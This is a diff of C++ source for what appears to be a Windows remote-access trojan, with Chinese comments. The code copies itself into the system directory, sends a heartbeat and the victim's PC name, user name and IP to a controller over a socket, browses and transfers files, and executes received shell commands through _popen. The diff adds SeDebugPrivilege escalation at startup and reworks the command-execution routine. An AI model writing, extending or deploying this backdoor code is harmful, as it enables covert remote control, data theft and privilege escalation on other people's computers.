@@ -6,14 +6,19 @@ int FileBrowse(SOCKET fd);//文件浏览
 
 int recvFile(SOCKET fd, char* buf);//文件下载
 
-int sendFile(SOCKET fd, char* buf);//文件上传
+int shell(const char* cmd, char* result);//执行shell指令
 
-int Shell(SOCKET fd, char* buf);//执行shell指令
+int sendFile(SOCKET fd, char* buf);//文件上传
 
 bool UpPrivilegeValue();//提权操作
 
 int main()
 {
+	if (true == UpPrivilegeValue())
+	{
+		//cout << "successs" << endl;
+	}
+
 	char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260
 
 	copySelf(pathName);//将文件复制到系统目录
@@ -33,12 +38,12 @@ int main()
 
 	HeartBeat(fd);//心跳功能
 
-	char command[16] = {0};//存储接收的指令
+	char command[BUFSIZ] = {0};//存储接收的指令
 	char recvbuf[BUFSIZ] = { 0 };//接收信息的缓冲区
 	//创建对应的线程，需要使用时就加入
 	while (true)
 	{
-		recv(fd, command, 16, 0);
+		recv(fd, command, BUFSIZ, 0);
 		decode(command);
 		if (strcmp(command, "filebrowse"))
 		{
@@ -126,7 +131,7 @@ int GetPCMessage(SOCKET fd)
 	encode(msg.PCName);//加密
 	//cout << msg.PCName << endl;
 	encode(UserName);
-	cout << UserName << endl;
+	//cout << UserName << endl;
 	encode(msg.IP);
 	//cout << msg.IP << endl;
 
@@ -232,62 +237,73 @@ int recvFile(SOCKET fd, char* buf)//文件下载
 	return 0;
 }
 
-int Shell(SOCKET fd, char* buf)
+int shell(const char* cmd, char* result)
 {
-	char shell[40] = { 0 };
-	char res[BUFSIZ * 2] = { 0 };
-	ZeroMemory(buf, sizeof(buf));
-	recv(fd, buf, strlen(buf), 0);	//接收发送来的shell指令
-	decode(buf);
-	for (int i = 1; buf[i] != '\0'; i++) 
+	int iRet = -1;
+	char buf_ps[CMD_RESULT_BUF_SIZE];
+	char ps[CMD_RESULT_BUF_SIZE] = { 0 };
+	FILE* ptr;
+
+	strcpy(ps, cmd);
+
+	if ((ptr = _popen(ps, "r")) != NULL)
 	{
-		shell[i - 1] = buf[i];
+		while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
+		{
+			strcat(result, buf_ps);
+			if (strlen(result) > CMD_RESULT_BUF_SIZE)
+			{
+				break;
+			}
+		}
+		_pclose(ptr);
+		ptr = NULL;
+		iRet = 0;  // 处理成功
 	}
-	if (!cmd(shell, res)) 
-	{
-		send(fd, res, strlen(res) + 1, 0);
-	}
-	else
-	{
-		char text[] = "CMD Error!";
-		encode(text);
-		send(fd, text, strlen(text), 0);
-	}
-	return 0;
+	//else
+	//{
+	//    printf("popen %s error\n", ps);
+	//    iRet = -1; // 处理失败
+	//}
+
+	return iRet;
 }
 
 bool UpPrivilegeValue()
 {
-	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
-	HANDLE hToken = nullptr;
-	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
+	HANDLE token_handle;
+	//打开访问令牌
+	if (!OpenProcessToken(GetCurrentProcess(),       //要修改权限的进程句柄
+		TOKEN_ALL_ACCESS,          //要对令牌进行何种操作
+		&token_handle              //访问令牌
+	))
 	{
-		return false;
+		//printf("openProcessToken error");
 	}
-	//LookupPrivilegeValue()函数查看系统权限的特权值
+
 	LUID luid;
-	if (FALSE == LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
+	if (!LookupPrivilegeValue(NULL,                 //查看的系统，本地为NULL
+		SE_DEBUG_NAME,        //要查看的特权名称
+		&luid                 //用来接收标识符
+	))
 	{
-		CloseHandle(hToken);
-		return false;
+		//printf("lookupPrivilegevalue error");
 	}
-	//调整权限设置
-	TOKEN_PRIVILEGES Tok;
-	Tok.PrivilegeCount = 1;
-	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	Tok.Privileges[0].Luid = luid;
-	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), nullptr, nullptr))
+	TOKEN_PRIVILEGES tkp;
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Luid = luid;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	//调整访问令牌权限
+	if (!AdjustTokenPrivileges(token_handle,    //令牌句柄
+		FALSE,           //是否禁用权限
+		&tkp,            //新的特权的权限信息
+		sizeof(tkp),     //特权信息大小
+		NULL,            //用来接收特权信息当前状态的buffer
+		NULL             //缓冲区大小
+	))
 	{
-		CloseHandle(hToken);
-		return false;
+		//printf("adjust error");
 	}
-
-	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-	{
-		CloseHandle(hToken);
-		return false;
-	}
-
-	CloseHandle(hToken);
+	//printf("sucessful");
 	return true;
 }
